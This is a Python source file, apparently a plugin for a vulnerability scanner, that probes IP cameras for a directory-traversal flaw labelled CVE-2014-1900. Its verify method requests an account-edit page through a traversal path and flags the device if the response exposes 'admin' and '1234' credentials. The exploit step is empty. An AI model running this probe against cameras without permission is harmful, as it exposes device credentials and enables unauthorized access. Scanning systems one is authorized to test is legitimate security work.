import requests

from loguru import logger

from .base import POCTemplate


class CamDirectoryTraversal03(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['cam']
        self.product_version = ''
        self.ref = 'CVE-2014-1900'
        self.level = POCTemplate.level.high
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/./en/account/accedit.asp?item=0"
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('admin' in r.text) and ('1234' in r.text):
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(CamDirectoryTraversal03)
